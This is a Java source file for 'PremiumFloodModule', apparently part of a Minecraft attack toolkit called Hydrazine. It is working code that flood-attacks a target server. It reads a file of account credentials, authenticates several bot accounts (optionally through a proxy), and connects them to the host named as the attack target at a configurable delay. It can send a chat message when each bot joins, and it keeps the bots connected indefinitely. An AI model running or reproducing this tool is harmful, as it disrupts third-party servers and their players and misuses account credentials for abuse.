package com.github.hydrazine.module.builtin;

import java.io.File;
import java.util.Random;

import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.event.session.PacketReceivedEvent;
import org.spacehq.packetlib.event.session.SessionAdapter;

import com.github.hydrazine.Hydrazine;
import com.github.hydrazine.minecraft.Authenticator;
import com.github.hydrazine.minecraft.Credentials;
import com.github.hydrazine.minecraft.Server;
import com.github.hydrazine.module.Module;
import com.github.hydrazine.module.ModuleSettings;
import com.github.hydrazine.util.ConnectionHelper;
import com.github.hydrazine.util.FileFactory;

/**
 * 
 * @author xTACTIXzZ
 * 
 * This module floods a premium server with alt accounts
 *
 */
public class PremiumFloodModule implements Module
{
	// Create new file where the configuration will be stored (Same folder as jar file)
	private File configFile = new File(ClassLoader.getSystemClassLoader().getResource(".").getPath() + ".module_" + getModuleName() + ".conf");
	
	// Configuration settings are stored in here
	private ModuleSettings settings = new ModuleSettings(configFile);
	
	@Override
	public String getModuleName() 
	{
		return "pflood";
	}

	@Override
	public String getDescription() 
	{
		return "Floods a premium server with bots.";
	}

	@Override
	public void start() 
	{
		// Load settings
		settings.load();
				
		if(!Hydrazine.settings.hasSetting("host") || Hydrazine.settings.getSetting("host") == null)
		{
			System.out.println(Hydrazine.errorPrefix + "You have to specify a server to attack (-h)");
			
			System.exit(1);
		}
		
		System.out.println(Hydrazine.infoPrefix + "Starting module \'" + getModuleName() + "\'. Press CTRL + C to exit.");
		
		Authenticator auth = new Authenticator();
		Server server = new Server(Hydrazine.settings.getSetting("host"), Integer.parseInt(Hydrazine.settings.getSetting("port")));
		
		int bots = 5;
		int delay = 1000;
		
		if(configFile.exists())
		{
			try
			{
				bots = Integer.parseInt(settings.getProperty("bots"));
				delay = Integer.parseInt(settings.getProperty("delay"));
			}
			catch(Exception e)
			{
				System.out.println(Hydrazine.errorPrefix + "Invalid value in configuration file. Reconfigure the module.");
			}
		}
		else
		{
			if(ModuleSettings.askUserYesNo("This module hasn't been configured yet. Would you like to do so now?"))
			{
				configure();

				start();
			}
			else
			{
				System.out.println(Hydrazine.errorPrefix + "Append the \'-c\' switch to configure the module.");
			}
			
			return;
		}
		
		// Load credentials from file
		if(settings.containsKey("credList") && !settings.getProperty("credList").isEmpty())
		{
			FileFactory ff = new FileFactory(new File(settings.getProperty("credList")));
				
			for(int i = 0; i < bots; i++)
			{
				Credentials[] credList = ff.getCredentials();
				
				if(credList.length == 0)
				{
					System.out.println(Hydrazine.errorPrefix + "No credentials contained in file.");
					
					return;
				}
				
				Random r = new Random();
				
				Credentials creds = credList[r.nextInt(credList.length)];
				
				MinecraftProtocol protocol = null;
				
				if(Hydrazine.settings.hasSetting("authproxy"))
				{
					protocol = auth.authenticate(creds, Authenticator.getAuthProxy());
				}
				else
				{
					protocol = auth.authenticate(creds);
				}
				
				if(protocol == null)
				{
					continue;
				}
				
				Client client = ConnectionHelper.connect(protocol, server);
				
				registerListeners(client);
				
				try 
				{
					Thread.sleep(delay);
				} 
				catch (InterruptedException e) 
				{
					e.printStackTrace();
				}
			}
			
			// Do nothing, clients stay connected until program shuts down
			while(true)
			{
				try 
				{
					Thread.sleep(20);
				} 
				catch (InterruptedException e)
				{
					e.printStackTrace();
				}
			}
		}
		else if(Hydrazine.settings.hasSetting("credentials"))
		{
			System.out.println(Hydrazine.errorPrefix + "We need more account credentials in order to flood the server. Reconfigure the module!");
		}
		else
		{
			System.out.println(Hydrazine.errorPrefix + "No credentials supplied. Reconfigure the module to do so.");
		}
	}

	@Override
	public void stop(String cause)
	{
		System.out.println(Hydrazine.infoPrefix + "Stopping module " + getModuleName() + ": " + cause);
		
		System.exit(0);
	}

	@Override
	public void configure()
	{		
		settings.setProperty("bots", ModuleSettings.askUser("How many bots should be connected to the server?"));
		settings.setProperty("delay", ModuleSettings.askUser("Delay between connection attempts: "));
		settings.setProperty("credList", ModuleSettings.askUser("Enter the path to the file containing minecraft account credentials:"));
		settings.setProperty("sendMessageOnJoin", String.valueOf(ModuleSettings.askUserYesNo("Send message on join?")));
		
		if(settings.getProperty("sendMessageOnJoin").equals("true"))
		{
			settings.setProperty("messageJoin", ModuleSettings.askUser("Message:"));
			settings.setProperty("messageDelay", ModuleSettings.askUser("Time to wait before sending message:"));
		}
		else
		{
			settings.setProperty("messageJoin", "");
		}
		
		// Create configuration file if not existing
		if(!configFile.exists())
		{
			boolean success = settings.createConfigFile();
			
			if(!success)
			{
				return;
			}
		}
		
		// Store configuration variables
		settings.store();
	}
	
	/*
	 * Register listeners
	 */
	private void registerListeners(Client client)
	{
		client.getSession().addListener(new SessionAdapter() 
		{
			@Override
			public void packetReceived(PacketReceivedEvent event) 
			{
			    if(event.getPacket() instanceof ServerJoinGamePacket) 
			    {
			        if(settings.containsKey("sendMessageOnJoin") && settings.containsKey("messageJoin"))
			        {
			        	if(!(settings.getProperty("messageJoin").isEmpty()))
			            {
			        		int delay = 1000;
			        		
			        		if(configFile.exists())
			        		{
			            		try
			            		{
			            			delay = Integer.parseInt(settings.getProperty("messageDelay"));
			            		}
			            		catch(Exception e)
			            		{
			            			System.out.println(Hydrazine.errorPrefix + "Invalid value in configuration file. Reconfigure the module.");
			            		}
			        		}
			        		
			        		try 
			        		{
			        			Thread.sleep(delay);
							} 
			        		catch (InterruptedException e) 
			        		{
			        			// Client got disconnected or smth else, do not print error
			        			
			        			return;
			        		}
			        		
			        		client.getSession().send(new ClientChatPacket(settings.getProperty("messageJoin")));
			            }
			        }
			    }
			}
		});
	}

	@Override
	public void run() 
	{
		start();
	}
}
